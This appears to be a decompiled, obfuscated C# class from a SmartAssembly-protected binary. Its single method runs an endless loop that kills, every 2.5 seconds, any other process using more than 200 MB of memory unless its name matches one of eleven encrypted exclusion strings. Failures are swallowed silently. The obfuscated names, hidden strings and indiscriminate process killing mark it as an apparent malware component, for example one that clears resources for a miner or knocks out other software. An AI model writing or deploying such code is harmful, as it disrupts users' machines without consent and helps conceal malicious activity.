using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace jtAYXTgtXeY;

public static class QMFcUchCCpj
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void SxvTtxlXYuJt()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107397589)) && !process.ProcessName.Contains(getString_0(107397548)) && !process.ProcessName.Contains(getString_0(107397539)) && !process.ProcessName.Contains(getString_0(107397562)) && !process.ProcessName.Contains(getString_0(107397517)) && !process.ProcessName.Contains(getString_0(107397504)) && !process.ProcessName.Contains(getString_0(107397523)) && !process.ProcessName.Contains(getString_0(107397478)) && !process.ProcessName.Contains(getString_0(107397497)) && !process.ProcessName.Contains(getString_0(107397452)) && !process.ProcessName.Contains(getString_0(107397463)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static QMFcUchCCpj()
	{
		Strings.CreateGetStringDelegate(typeof(QMFcUchCCpj));
	}
}
